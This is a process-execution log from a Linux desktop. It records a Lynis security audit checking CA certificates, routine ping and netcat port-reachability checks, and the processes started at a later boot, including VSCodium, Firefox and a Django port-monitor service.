+[Mon Jun  9 17:08:28 2025] lynis (76308): /bin/sh /usr/sbin/lynis audit system --cronjob
+[Mon Jun  9 17:08:28 2025] dpkg-query (76309): dpkg-query --search -- /usr/share/ca-certificates/mozilla/GTS_Root_R2.crt
+[Mon Jun  9 17:08:28 2025] awk (76310): /usr/bin/awk -F: {print $1}
+[Mon Jun  9 17:08:29 2025] lynis (76360): /bin/sh /usr/sbin/lynis audit system --cronjob
+[Mon Jun  9 17:08:29 2025] dpkg-query (76361): dpkg-query --search -- /usr/share/ca-certificates/mozilla/GTS_Root_R4.crt
+[Mon Jun  9 17:08:29 2025] awk (76362): /usr/bin/awk -F: {print $1}
+[Mon Jun  9 17:08:30 2025] lynis (76414): /bin/sh /usr/sbin/lynis audit system --cronjob
+[Mon Jun  9 17:08:30 2025] dpkg-query (76415): dpkg-query --search -- /usr/share/ca-certificates/mozilla/GlobalSign_ECC_Root_CA_-_R5.crt
+[Mon Jun  9 17:08:30 2025] awk (76416): /usr/bin/awk -F: {print $1}
+[Mon Jun  9 17:08:31 2025] lynis (76466): /bin/sh /usr/sbin/lynis audit system --cronjob
+[Mon Jun  9 17:08:31 2025] dpkg-query (76467): dpkg-query --search -- /usr/share/ca-certificates/mozilla/GlobalSign_Root_CA_-_R3.crt
+[Mon Jun  9 17:08:31 2025] awk (76468): /usr/bin/awk -F: {print $1}
+[Mon Jun  9 17:08:32 2025] lynis (76518): /bin/sh /usr/sbin/lynis audit system --cronjob
+[Mon Jun  9 17:08:32 2025] dpkg-query (76519): dpkg-query --search -- /usr/share/ca-certificates/mozilla/GlobalSign_Root_E46.crt
+[Mon Jun  9 17:08:32 2025] awk (76520): /usr/bin/awk -F: {print $1}
+[Mon Jun  9 17:08:33 2025] lynis (76544): /bin/sh /usr/sbin/lynis audit system --cronjob
+[Mon Jun  9 17:08:33 2025] dpkg-query (76545): dpkg-query --search -- /usr/share/ca-certificates/mozilla/GlobalSign_Root_R46.crt
+[Mon Jun  9 17:08:33 2025] awk (76546): /usr/bin/awk -F: {print $1}
+[Mon Jun  9 17:08:35 2025] lynis (76674): /bin/sh /usr/sbin/lynis audit system --cronjob
+[Mon Jun  9 17:08:35 2025] dpkg-query (76675): dpkg-query --search -- /usr/share/ca-certificates/mozilla/Hellenic_Academic_and_Research_Institutions_ECC_RootCA_2015.crt
+[Mon Jun  9 17:08:35 2025] awk (76676): /usr/bin/awk -F: {print $1}
+[Mon Jun  9 17:08:36 2025] ping (76679): ping -c 3 8.8.8.8
+[Mon Jun  9 17:08:36 2025] lynis (76730): /bin/sh /usr/sbin/lynis audit system --cronjob
+[Mon Jun  9 17:08:36 2025] dpkg-query (76731): dpkg-query --search -- /usr/share/ca-certificates/mozilla/HiPKI_Root_CA_-_G1.crt
+[Mon Jun  9 17:08:36 2025] awk (76732): /usr/bin/awk -F: {print $1}
+[Mon Jun  9 17:08:38 2025] lynis (76834): /bin/sh /usr/sbin/lynis audit system --cronjob
+[Mon Jun  9 17:08:38 2025] dpkg-query (76835): dpkg-query --search -- /usr/share/ca-certificates/mozilla/ISRG_Root_X2.crt
+[Mon Jun  9 17:08:38 2025] awk (76836): /usr/bin/awk -F: {print $1}
+[Mon Jun  9 17:08:39 2025] lynis (76886): /bin/sh /usr/sbin/lynis audit system --cronjob
+[Mon Jun  9 17:08:39 2025] dpkg-query (76887): dpkg-query --search -- /usr/share/ca-certificates/mozilla/IdenTrust_Public_Sector_Root_CA_1.crt
+[Mon Jun  9 17:08:39 2025] awk (76888): /usr/bin/awk -F: {print $1}
+[Mon Jun  9 17:08:40 2025] lynis (76938): /bin/sh /usr/sbin/lynis audit system --cronjob
+[Mon Jun  9 17:08:40 2025] dpkg-query (76939): dpkg-query --search -- /usr/share/ca-certificates/mozilla/Microsec_e-Szigno_Root_CA_2009.crt
+[Mon Jun  9 17:08:40 2025] awk (76940): /usr/bin/awk -F: {print $1}
+[Mon Jun  9 17:08:41 2025] lynis (76993): /bin/sh /usr/sbin/lynis audit system --cronjob
+[Mon Jun  9 17:08:41 2025] dpkg-query (76994): dpkg-query --search -- /usr/share/ca-certificates/mozilla/Microsoft_RSA_Root_Certificate_Authority_2017.crt
+[Mon Jun  9 17:08:41 2025] awk (76995): /usr/bin/awk -F: {print $1}
+[Mon Jun  9 17:08:42 2025] lynis (77045): /bin/sh /usr/sbin/lynis audit system --cronjob
+[Mon Jun  9 17:08:42 2025] dpkg-query (77046): dpkg-query --search -- /usr/share/ca-certificates/mozilla/NetLock_Arany_=Class_Gold=_Főtanúsítvány.crt
+[Mon Jun  9 17:08:42 2025] awk (77047): /usr/bin/awk -F: {print $1}
+[Mon Jun  9 17:08:43 2025] lynis (77097): /bin/sh /usr/sbin/lynis audit system --cronjob
+[Mon Jun  9 17:08:43 2025] dpkg-query (77098): dpkg-query --search -- /usr/share/ca-certificates/mozilla/OISTE_WISeKey_Global_Root_GC_CA.crt
+[Mon Jun  9 17:08:43 2025] awk (77099): /usr/bin/awk -F: {print $1}
+[Mon Jun  9 17:08:45 2025] lynis (77149): /bin/sh /usr/sbin/lynis audit system --cronjob
+[Mon Jun  9 17:08:45 2025] dpkg-query (77150): dpkg-query --search -- /usr/share/ca-certificates/mozilla/QuoVadis_Root_CA_2.crt
+[Mon Jun  9 17:08:45 2025] awk (77151): /usr/bin/awk -F: {print $1}
+[Mon Jun  9 17:08:50 2025] lynis (77203): /bin/sh /usr/sbin/lynis audit system --cronjob
+[Mon Jun  9 17:08:50 2025] dpkg-query (77204): dpkg-query --search -- /usr/share/ca-certificates/mozilla/QuoVadis_Root_CA_3.crt
+[Mon Jun  9 17:08:50 2025] awk (77205): /usr/bin/awk -F: {print $1}
+[Mon Jun  9 17:08:51 2025] lynis (77255): /bin/sh /usr/sbin/lynis audit system --cronjob
+[Mon Jun  9 17:08:51 2025] dpkg-query (77256): dpkg-query --search -- /usr/share/ca-certificates/mozilla/SSL.com_EV_Root_Certification_Authority_ECC.crt
+[Mon Jun  9 17:08:51 2025] awk (77257): /usr/bin/awk -F: {print $1}
+[Mon Jun  9 17:08:52 2025] lynis (77307): /bin/sh /usr/sbin/lynis audit system --cronjob
+[Mon Jun  9 17:08:52 2025] dpkg-query (77308): dpkg-query --search -- /usr/share/ca-certificates/mozilla/SSL.com_Root_Certification_Authority_ECC.crt
+[Mon Jun  9 17:08:52 2025] awk (77309): /usr/bin/awk -F: {print $1}
+[Mon Jun  9 17:08:53 2025] lynis (77359): /bin/sh /usr/sbin/lynis audit system --cronjob
+[Mon Jun  9 17:08:53 2025] dpkg-query (77360): dpkg-query --search -- /usr/share/ca-certificates/mozilla/SZAFIR_ROOT_CA2.crt
+[Mon Jun  9 17:08:53 2025] awk (77361): /usr/bin/awk -F: {print $1}
+[Mon Jun  9 17:08:54 2025] sh (77362): sh -c nc -z -w 5 serveo.net 22 && echo "open" || echo "closed"
+[Mon Jun  9 17:08:54 2025] sh (77363): sh -c bash -c "ping -c 1 -W 2 8.8.8.8 >/dev/null 2>&1 && echo UP || echo DOWN"
+[Mon Jun  9 17:08:54 2025] nc (77364): nc -z -w 5 serveo.net 22
+[Mon Jun  9 17:08:54 2025] bash (77365): bash -c ping -c 1 -W 2 8.8.8.8 >/dev/null 2>&1 && echo UP || echo DOWN
+[Mon Jun  9 17:08:54 2025] ping (77366): ping -c 1 -W 2 8.8.8.8
+[Mon Jun  9 17:08:54 2025] ping (77395): ping -c 3 8.8.8.8
+[Mon Jun  9 17:08:54 2025] lynis (77420): /bin/sh /usr/sbin/lynis audit system --cronjob
+[Mon Jun  9 17:08:54 2025] dpkg-query (77421): dpkg-query --search -- /usr/share/ca-certificates/mozilla/SecureTrust_CA.crt
+[Mon Jun  9 17:08:54 2025] awk (77422): /usr/bin/awk -F: {print $1}
+[Mon Jun  9 17:08:55 2025] lynis (77472): /bin/sh /usr/sbin/lynis audit system --cronjob
+[Mon Jun  9 17:08:55 2025] dpkg-query (77473): dpkg-query --search -- /usr/share/ca-certificates/mozilla/Security_Communication_ECC_RootCA1.crt
+[Mon Jun  9 17:08:55 2025] awk (77474): /usr/bin/awk -F: {print $1}
+[Mon Jun  9 17:08:56 2025] lynis (77524): /bin/sh /usr/sbin/lynis audit system --cronjob
+[Mon Jun  9 17:08:56 2025] dpkg-query (77525): dpkg-query --search -- /usr/share/ca-certificates/mozilla/Security_Communication_RootCA3.crt
+[Mon Jun  9 17:08:56 2025] awk (77526): /usr/bin/awk -F: {print $1}
+[Mon Jun  9 17:08:57 2025] lynis (77576): /bin/sh /usr/sbin/lynis audit system --cronjob
+[Mon Jun  9 17:08:57 2025] dpkg-query (77577): dpkg-query --search -- /usr/share/ca-certificates/mozilla/Starfield_Class_2_CA.crt
+[Mon Jun  9 17:08:57 2025] awk (77578): /usr/bin/awk -F: {print $1}
+[Mon Jun  9 17:08:58 2025] lynis (77628): /bin/sh /usr/sbin/lynis audit system --cronjob
+[Mon Jun  9 17:08:58 2025] dpkg-query (77629): dpkg-query --search -- /usr/share/ca-certificates/mozilla/Starfield_Services_Root_Certificate_Authority_-_G2.crt
+[Mon Jun  9 17:08:58 2025] awk (77630): /usr/bin/awk -F: {print $1}
+[Mon Jun  9 17:08:59 2025] lynis (77680): /bin/sh /usr/sbin/lynis audit system --cronjob
+[Mon Jun  9 17:08:59 2025] dpkg-query (77681): dpkg-query --search -- /usr/share/ca-certificates/mozilla/SwissSign_Silver_CA_-_G2.crt
+[Mon Jun  9 17:08:59 2025] awk (77682): /usr/bin/awk -F: {print $1}
+[Mon Jun  9 17:09:00 2025] lynis (77734): /bin/sh /usr/sbin/lynis audit system --cronjob
+[Mon Jun  9 17:09:00 2025] dpkg-query (77735): dpkg-query --search -- /usr/share/ca-certificates/mozilla/T-TeleSec_GlobalRoot_Class_3.crt
+[Mon Jun  9 17:09:00 2025] awk (77736): /usr/bin/awk -F: {print $1}
+[Mon Jun  9 17:09:01 2025] lynis (77786): /bin/sh /usr/sbin/lynis audit system --cronjob
+[Mon Jun  9 17:09:01 2025] dpkg-query (77787): dpkg-query --search -- /usr/share/ca-certificates/mozilla/TWCA_Global_Root_CA.crt
+[Mon Jun  9 17:09:01 2025] awk (77788): /usr/bin/awk -F: {print $1}
+[Mon Jun  9 17:09:02 2025] lynis (77840): /bin/sh /usr/sbin/lynis audit system --cronjob
+[Mon Jun  9 17:09:02 2025] dpkg-query (77841): dpkg-query --search -- /usr/share/ca-certificates/mozilla/TeliaSonera_Root_CA_v1.crt
+[Mon Jun  9 17:09:02 2025] awk (77842): /usr/bin/awk -F: {print $1}
+[Mon Jun  9 17:09:03 2025] lynis (77892): /bin/sh /usr/sbin/lynis audit system --cronjob
+[Mon Jun  9 17:09:03 2025] dpkg-query (77893): dpkg-query --search -- /usr/share/ca-certificates/mozilla/TrustCor_ECA-1.crt
+[Mon Jun  9 17:09:03 2025] awk (77894): /usr/bin/awk -F: {print $1}
+[Mon Jun  9 17:09:05 2025] lynis (78013): /bin/sh /usr/sbin/lynis audit system --cronjob
+[Mon Jun  9 17:09:05 2025] ls (78014): /usr/bin/ls -d -l /usr/share/ca-certificates/mozilla/Trustwave_Global_ECC_P384_Certification_Authority.crt
+[Mon Jun  9 17:09:07 2025] lynis (78128): /bin/sh /usr/sbin/lynis audit system --cronjob
+[Mon Jun  9 17:09:07 2025] dpkg-query (78129): dpkg-query --search -- /usr/share/ca-certificates/mozilla/USERTrust_ECC_Certification_Authority.crt
+[Mon Jun  9 17:09:07 2025] awk (78130): /usr/bin/awk -F: {print $1}
+[Mon Jun  9 17:09:09 2025] lynis (78180): /bin/sh /usr/sbin/lynis audit system --cronjob
+[Mon Jun  9 17:09:09 2025] dpkg-query (78181): dpkg-query --search -- /usr/share/ca-certificates/mozilla/XRamp_Global_CA_Root.crt
+[Mon Jun  9 17:09:09 2025] awk (78182): /usr/bin/awk -F: {print $1}
+[Mon Jun  9 17:09:10 2025] lynis (78232): /bin/sh /usr/sbin/lynis audit system --cronjob
+[Mon Jun  9 17:09:10 2025] dpkg-query (78233): dpkg-query --search -- /usr/share/ca-certificates/mozilla/certSIGN_Root_CA_G2.crt
+[Mon Jun  9 17:09:10 2025] awk (78234): /usr/bin/awk -F: {print $1}
+[Mon Jun  9 17:09:11 2025] lynis (78284): /bin/sh /usr/sbin/lynis audit system --cronjob
+[Mon Jun  9 17:09:11 2025] dpkg-query (78285): dpkg-query --search -- /usr/share/ca-certificates/mozilla/ePKI_Root_Certification_Authority.crt
+[Mon Jun  9 17:09:11 2025] awk (78286): /usr/bin/awk -F: {print $1}
+[Mon Jun  9 17:09:12 2025] ping (78316): ping -c 3 8.8.8.8
+[Mon Jun  9 17:09:12 2025] lynis (78341): /bin/sh /usr/sbin/lynis audit system --cronjob
+[Mon Jun  9 17:09:12 2025] dpkg-query (78342): dpkg-query --search -- /usr/share/ca-certificates/mozilla/emSign_ECC_Root_CA_-_G3.crt
+[Mon Jun  9 17:09:12 2025] awk (78343): /usr/bin/awk -F: {print $1}
+[Mon Jun  9 17:09:13 2025] lynis (78393): /bin/sh /usr/sbin/lynis audit system --cronjob
+[Mon Jun  9 17:09:13 2025] dpkg-query (78394): dpkg-query --search -- /usr/share/ca-certificates/mozilla/emSign_Root_CA_-_G1.crt
+[Mon Jun  9 17:09:13 2025] awk (78395): /usr/bin/awk -F: {print $1}
+[Mon Jun  9 17:09:14 2025] lynis (78445): /bin/sh /usr/sbin/lynis audit system --cronjob
+[Mon Jun  9 17:09:14 2025] dpkg-query (78446): dpkg-query --search -- /usr/share/ca-certificates/mozilla/vTrus_Root_CA.crt
+[Mon Jun  9 17:09:14 2025] awk (78447): /usr/bin/awk -F: {print $1}
+[Mon Jun  9 17:09:15 2025] lynis (78502): /bin/sh /usr/sbin/lynis audit system --cronjob
+[Mon Jun  9 17:09:15 2025] dpkg-query (78503): dpkg-query --search -- /usr/share/gnupg/sks-keyservers.netCA.pem
+[Mon Jun  9 17:09:15 2025] awk (78504): /usr/bin/awk -F: {print $1}
+[Mon Jun  9 17:09:29 2025] ping (84929): ping -c 3 8.8.8.8
+[Mon Jun  9 17:09:48 2025] ping (84939): ping -c 3 8.8.8.8
+[Mon Jun  9 17:09:54 2025] sh (84941): sh -c nc -z -w 5 serveo.net 22 && echo "open" || echo "closed"
+[Mon Jun  9 17:09:54 2025] sh (84942): sh -c bash -c "ping -c 1 -W 2 8.8.8.8 >/dev/null 2>&1 && echo UP || echo DOWN"
+[Mon Jun  9 17:09:54 2025] nc (84943): nc -z -w 5 serveo.net 22
+[Mon Jun  9 17:09:54 2025] bash (84944): bash -c ping -c 1 -W 2 8.8.8.8 >/dev/null 2>&1 && echo UP || echo DOWN
+[Mon Jun  9 17:09:54 2025] ping (84945): ping -c 1 -W 2 8.8.8.8
+[Mon Jun  9 17:10:02 2025] exim4 (84958): /usr/sbin/exim4 -Mc 1uOdCM-000M6H-0o
+[Mon Jun  9 17:10:02 2025] exim4 (84959): /usr/sbin/exim4 -Mc 1uOdCM-000M6H-0o
+[Mon Jun  9 17:10:05 2025] ping (84964): ping -c 3 8.8.8.8
+[Mon Jun  9 17:10:13 2025] ping (84971): ping -c 3 8.8.8.8
+[Mon Jun  9 17:10:22 2025] sh (84975): /bin/sh -c mate-terminal
+[Mon Jun  9 17:10:23 2025] ping (84988): ping -c 3 8.8.8.8
+[Mon Jun  9 17:10:26 2025] ping (85003): ping google.com
+[Mon Jun  9 17:10:32 2025] ping (85007): ping -c 3 8.8.8.8
+[Mon Jun  9 17:10:41 2025] ping (85011): ping -c 3 8.8.8.8
+[Mon Jun  9 17:10:50 2025] ping (85018): ping -c 3 8.8.8.8
+[Mon Jun  9 17:10:53 2025] sh (85020): sh -c nc -z -w 5 serveo.net 22 && echo "open" || echo "closed"
+[Mon Jun  9 17:10:53 2025] nc (85022): nc -z -w 5 serveo.net 22
+[Mon Jun  9 17:10:58 2025] ping (85027): ping -c 3 8.8.8.8
+[Mon Jun  9 17:11:09 2025] ping (85034): ping -c 3 8.8.8.8
+[Mon Jun  9 17:11:17 2025] ping (85039): ping -c 3 8.8.8.8
+[Mon Jun  9 17:11:27 2025] ping (85045): ping -c 3 8.8.8.8
+[Mon Jun  9 17:11:35 2025] ping (85049): ping -c 3 8.8.8.8
+[Mon Jun  9 17:11:45 2025] ping (85057): ping -c 3 8.8.8.8
+[Mon Jun  9 17:11:53 2025] ping (85061): ping -c 3 8.8.8.8
+[Mon Jun  9 17:11:54 2025] sh (85063): sh -c bash -c "ping -c 1 -W 2 8.8.8.8 >/dev/null 2>&1 && echo UP || echo DOWN"
+[Mon Jun  9 17:11:54 2025] sh (85064): sh -c nc -z -w 5 serveo.net 22 && echo "open" || echo "closed"
+[Mon Jun  9 17:11:54 2025] bash (85065): bash -c ping -c 1 -W 2 8.8.8.8 >/dev/null 2>&1 && echo UP || echo DOWN
+[Mon Jun  9 17:11:54 2025] ping (85066): ping -c 1 -W 2 8.8.8.8
+[Mon Jun  9 17:11:54 2025] nc (85067): nc -z -w 5 serveo.net 22
+[Mon Jun  9 17:13:58 2025] systemd (1): /sbin/init splash noautomount splash
+[Mon Jun  9 17:13:58 2025] haveged (893): /usr/sbin/haveged --Foreground --verbose=1
+[Mon Jun  9 17:13:58 2025] cron (923): /usr/sbin/cron -f
+[Mon Jun  9 17:13:58 2025] dbus-daemon (924): /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
+[Mon Jun  9 17:13:58 2025] polkitd (928): /usr/lib/polkit-1/polkitd --no-debug
+[Mon Jun  9 17:13:58 2025] rngd (929): /usr/sbin/rngd -f
+[Mon Jun  9 17:13:58 2025] smartd (931): /usr/sbin/smartd -n
+[Mon Jun  9 17:13:58 2025] NetworkManager (986): /usr/sbin/NetworkManager --no-daemon
+[Mon Jun  9 17:13:58 2025] wpa_supplicant (987): /sbin/wpa_supplicant -u -s -O DIR=/run/wpa_supplicant GROUP=netdev
+[Mon Jun  9 17:13:58 2025] chronyd (1052): /usr/sbin/chronyd -F 1
+[Mon Jun  9 17:13:58 2025] agetty (1055): /sbin/agetty -o -p -- \u --noclear - linux
+[Mon Jun  9 17:13:58 2025] Xorg (1056): /usr/lib/xorg/Xorg :0 -seat seat0 -auth /var/run/lightdm/root/:0 -nolisten tcp vt7 -novtswitch
+[Mon Jun  9 17:13:58 2025] chronyd (1070): /usr/sbin/chronyd -F 1
+[Mon Jun  9 17:13:58 2025] postgres (1096): /usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/15/main -c config_file=/etc/postgresql/15/main/postgresql.conf
+[Mon Jun  9 17:13:58 2025] postgres (1144): postgres: 15/main: checkpointer                                                                                          
+[Mon Jun  9 17:13:58 2025] postgres (1145): postgres: 15/main: background writer                                                                                     
+[Mon Jun  9 17:13:58 2025] postgres (1147): postgres: 15/main: walwriter                                                                                             
+[Mon Jun  9 17:13:58 2025] postgres (1148): postgres: 15/main: autovacuum launcher                                                                                   
+[Mon Jun  9 17:13:58 2025] postgres (1149): postgres: 15/main: logical replication launcher                                                                          
+[Mon Jun  9 17:13:58 2025] lightdm (1332): lightdm --session-child 13 20
+[Mon Jun  9 17:13:58 2025] systemd (1352): /lib/systemd/systemd --user
+[Mon Jun  9 17:13:58 2025] pulseaudio (1371): /usr/bin/pulseaudio --daemonize=no --log-target=journal
+[Mon Jun  9 17:13:58 2025] gnome-keyring-daemon (1373): /usr/bin/gnome-keyring-daemon --foreground --components=pkcs11,secrets --control-directory=/run/user/1000/keyring
+[Mon Jun  9 17:13:58 2025] dbus-daemon (1380): /usr/bin/dbus-daemon --session --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
+[Mon Jun  9 17:13:58 2025] ssh-agent (1445): /usr/bin/ssh-agent mate-session
+[Mon Jun  9 17:13:58 2025] gvfsd-fuse (1453): /usr/libexec/gvfsd-fuse /run/user/1000/gvfs -f
+[Mon Jun  9 17:13:58 2025] dbus-daemon (1467): /usr/bin/dbus-daemon --config-file=/usr/share/defaults/at-spi2/accessibility.conf --nofork --print-address 11 --address=unix:path=/run/user/1000/at-spi/bus_0
+[Mon Jun  9 17:13:58 2025] at-spi2-registryd (1479): /usr/libexec/at-spi2-registryd --use-gnome-session
+[Mon Jun  9 17:13:58 2025] syndaemon (1514): syndaemon -i 0.5 -K -R
+[Mon Jun  9 17:13:58 2025] sh (1571): /bin/sh -c pkill -15 opensnitch-ui; opensnitch-ui
+[Mon Jun  9 17:13:58 2025] blueman-applet (1572): /usr/bin/python3 /usr/bin/blueman-applet
+[Mon Jun  9 17:13:58 2025] opensnitch-ui (1597): /usr/bin/python3 /usr/bin/opensnitch-ui
+[Mon Jun  9 17:13:58 2025] applet.py (1684): /usr/bin/python3 /usr/share/system-config-printer/applet.py
+[Mon Jun  9 17:13:58 2025] python3 (1686): python3 /usr/bin/hack
+[Mon Jun  9 17:13:58 2025] compiz (1695): compiz --replace
+[Mon Jun  9 17:13:58 2025] fusermount3 (1725): fusermount3 -o rw,nosuid,nodev,fsname=portal,auto_unmount,subtype=portal -- /run/user/1000/doc
+[Mon Jun  9 17:13:58 2025] blueman-tray (1734): /usr/bin/python3 /usr/bin/blueman-tray
+[Mon Jun  9 17:13:58 2025] gvfsd-trash (1881): /usr/libexec/gvfsd-trash --spawner :1.10 /org/gtk/gvfs/exec_spaw/0
+[Mon Jun  9 17:13:58 2025] sh (1887): /bin/sh -c compiz-decorator --replace
+[Mon Jun  9 17:13:58 2025] gtk-window-decorator (1888): gtk-window-decorator --replace
+[Mon Jun  9 17:13:58 2025] mount.ntfs (2117): /sbin/mount.ntfs /dev/sda5 /media/cybergorad/148 Go -o rw,nodev,nosuid,uid=1000,gid=1001,windows_names,uhelper=udisks2
+[Mon Jun  9 17:13:58 2025] sh (2282): /bin/sh -c mate-terminal
+[Mon Jun  9 17:13:58 2025] sudo (2529): sudo su
+[Mon Jun  9 17:13:58 2025] sudo (2534): sudo su
+[Mon Jun  9 17:13:58 2025] daphne (2572): /home/cybergorad/Desktop/django/django-environnement/bin/python3 /home/cybergorad/Desktop/django/django-environnement/bin/daphne -b 0.0.0.0 -p 8000 port_monitor.asgi:application
+[Mon Jun  9 17:13:58 2025] codium (2575): /usr/share/codium/codium --unity-launch
+[Mon Jun  9 17:13:58 2025] codium (2596): /usr/share/codium/codium --type=zygote --no-zygote-sandbox
+[Mon Jun  9 17:13:58 2025] codium (2597): /usr/share/codium/codium --type=zygote
+[Mon Jun  9 17:13:58 2025] codium (2599): /usr/share/codium/codium --type=zygote
+[Mon Jun  9 17:13:58 2025] codium (2633): /usr/share/codium/codium --type=gpu-process --enable-crash-reporter=5fd59ccf-15f4-47c3-9479-ba5c23315eb9,no_channel --user-data-dir=/home/cybergorad/.config/VSCodium --gpu-preferences=WAAAAAAAAAAgAAAEAAAAAAAAAAAAAAAAAABgAAAAAAA4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAGAAAAAAAAAAYAAAAAAAAAAgAAAAAAAAACAAAAAAAAAAIAAAAAAAAAA== --shared-files --field-trial-handle=0,i,9500104792263893600,4724816815270952478,262144 --disable-features=CalculateNativeWinOcclusion,SpareRendererForSitePerProcess
+[Mon Jun  9 17:13:58 2025] codium (2641): /usr/share/codium/codium --type=utility --utility-sub-type=network.mojom.NetworkService --lang=en-US --service-sandbox-type=none --enable-crash-reporter=5fd59ccf-15f4-47c3-9479-ba5c23315eb9,no_channel --user-data-dir=/home/cybergorad/.config/VSCodium --standard-schemes=vscode-webview,vscode-file --enable-sandbox --secure-schemes=vscode-webview,vscode-file --bypasscsp-schemes --cors-schemes=vscode-webview,vscode-file --fetch-schemes=vscode-webview,vscode-file --service-worker-schemes=vscode-webview --streaming-schemes --shared-files=v8_context_snapshot_data:100 --field-trial-handle=0,i,9500104792263893600,4724816815270952478,262144 --disable-features=CalculateNativeWinOcclusion,SpareRendererForSitePerProcess
+[Mon Jun  9 17:13:58 2025] codium (2679): /usr/share/codium/codium --type=renderer --enable-crash-reporter=5fd59ccf-15f4-47c3-9479-ba5c23315eb9,no_channel --user-data-dir=/home/cybergorad/.config/VSCodium --standard-schemes=vscode-webview,vscode-file --enable-sandbox --secure-schemes=vscode-webview,vscode-file --bypasscsp-schemes --cors-schemes=vscode-webview,vscode-file --fetch-schemes=vscode-webview,vscode-file --service-worker-schemes=vscode-webview --streaming-schemes --app-path=/usr/share/codium/resources/app --enable-sandbox --enable-blink-features=HighlightAPI --first-renderer-process --lang=en-US --num-raster-threads=2 --enable-main-frame-before-activation --renderer-client-id=4 --time-ticks-at-unix-epoch=-1749476693408747 --launch-time-ticks=284494572 --shared-files=v8_context_snapshot_data:100 --field-trial-handle=0,i,9500104792263893600,4724816815270952478,262144 --disable-features=CalculateNativeWinOcclusion,SpareRendererForSitePerProcess --vscode-window-config=vscode:6d46a003-2463-4db9-b053-c439f6424ef1
+[Mon Jun  9 17:13:58 2025] codium (2765): /usr/share/codium/codium --type=utility --utility-sub-type=node.mojom.NodeService --lang=en-US --service-sandbox-type=none --dns-result-order=ipv4first --inspect-port=0 --enable-crash-reporter=5fd59ccf-15f4-47c3-9479-ba5c23315eb9,no_channel --user-data-dir=/home/cybergorad/.config/VSCodium --standard-schemes=vscode-webview,vscode-file --enable-sandbox --secure-schemes=vscode-webview,vscode-file --bypasscsp-schemes --cors-schemes=vscode-webview,vscode-file --fetch-schemes=vscode-webview,vscode-file --service-worker-schemes=vscode-webview --streaming-schemes --shared-files=v8_context_snapshot_data:100 --field-trial-handle=0,i,9500104792263893600,4724816815270952478,262144 --disable-features=CalculateNativeWinOcclusion,SpareRendererForSitePerProcess
+[Mon Jun  9 17:13:58 2025] codium (2775): /usr/share/codium/codium --type=utility --utility-sub-type=node.mojom.NodeService --lang=en-US --service-sandbox-type=none --enable-crash-reporter=5fd59ccf-15f4-47c3-9479-ba5c23315eb9,no_channel --user-data-dir=/home/cybergorad/.config/VSCodium --standard-schemes=vscode-webview,vscode-file --enable-sandbox --secure-schemes=vscode-webview,vscode-file --bypasscsp-schemes --cors-schemes=vscode-webview,vscode-file --fetch-schemes=vscode-webview,vscode-file --service-worker-schemes=vscode-webview --streaming-schemes --shared-files=v8_context_snapshot_data:100 --field-trial-handle=0,i,9500104792263893600,4724816815270952478,262144 --disable-features=CalculateNativeWinOcclusion,SpareRendererForSitePerProcess
+[Mon Jun  9 17:13:58 2025] codium (2776): /usr/share/codium/codium --type=utility --utility-sub-type=node.mojom.NodeService --lang=en-US --service-sandbox-type=none --enable-crash-reporter=5fd59ccf-15f4-47c3-9479-ba5c23315eb9,no_channel --user-data-dir=/home/cybergorad/.config/VSCodium --standard-schemes=vscode-webview,vscode-file --enable-sandbox --secure-schemes=vscode-webview,vscode-file --bypasscsp-schemes --cors-schemes=vscode-webview,vscode-file --fetch-schemes=vscode-webview,vscode-file --service-worker-schemes=vscode-webview --streaming-schemes --shared-files=v8_context_snapshot_data:100 --field-trial-handle=0,i,9500104792263893600,4724816815270952478,262144 --disable-features=CalculateNativeWinOcclusion,SpareRendererForSitePerProcess
+[Mon Jun  9 17:13:58 2025] Socket Process (2842): /usr/lib/firefox-esr/firefox-esr -contentproc -parentBuildID 20240115170312 -prefsLen 28321 -prefMapSize 241962 -appDir /usr/lib/firefox-esr/browser {71045b43-b8e7-47b2-9c9f-20e36503fec5} 2613 true socket
+[Mon Jun  9 17:13:58 2025] Privileged Cont (2886): /usr/lib/firefox-esr/firefox-esr -contentproc -childID 1 -isForBrowser -prefsLen 28397 -prefMapSize 241962 -jsInitLen 240916 -parentBuildID 20240115170312 -appDir /usr/lib/firefox-esr/browser {e4bac63b-f0d7-4e0c-ae51-4abd62523dff} 2613 true tab
+[Mon Jun  9 17:13:58 2025] codium (2923): /usr/share/codium/codium /usr/share/codium/resources/app/extensions/html-language-features/server/dist/node/htmlServerMain --node-ipc --clientProcessId=2765
+[Mon Jun  9 17:13:58 2025] python3 (2944): /bin/python3 /home/cybergorad/.vscode-oss/extensions/ms-python.python-2024.2.1-universal/pythonFiles/run-jedi-language-server.py
+[Mon Jun  9 17:13:58 2025] pcscd (2945): /usr/sbin/pcscd --foreground --auto-exit
+[Mon Jun  9 17:13:58 2025] codium (2950): /usr/share/codium/codium --type=utility --utility-sub-type=node.mojom.NodeService --lang=en-US --service-sandbox-type=none --enable-crash-reporter=5fd59ccf-15f4-47c3-9479-ba5c23315eb9,no_channel --user-data-dir=/home/cybergorad/.config/VSCodium --standard-schemes=vscode-webview,vscode-file --enable-sandbox --secure-schemes=vscode-webview,vscode-file --bypasscsp-schemes --cors-schemes=vscode-webview,vscode-file --fetch-schemes=vscode-webview,vscode-file --service-worker-schemes=vscode-webview --streaming-schemes --shared-files=v8_context_snapshot_data:100 --field-trial-handle=0,i,9500104792263893600,4724816815270952478,262144 --disable-features=CalculateNativeWinOcclusion,SpareRendererForSitePerProcess
+[Mon Jun  9 17:13:58 2025] WebExtensions (2979): /usr/lib/firefox-esr/firefox-esr -contentproc -childID 2 -isForBrowser -prefsLen 31898 -prefMapSize 241962 -jsInitLen 240916 -parentBuildID 20240115170312 -appDir /usr/lib/firefox-esr/browser {76af828c-b287-4282-8937-c0e98e536c09} 2613 true tab
+[Mon Jun  9 17:13:58 2025] Isolated Web Co (4035): /usr/lib/firefox-esr/firefox-esr -contentproc -childID 30 -isForBrowser -prefsLen 25517 -prefMapSize 241962 -jsInitLen 240916 -parentBuildID 20240115170312 -appDir /usr/lib/firefox-esr/browser {ecb5bd76-7358-432a-b7c1-e504625d69b3} 2613 true tab
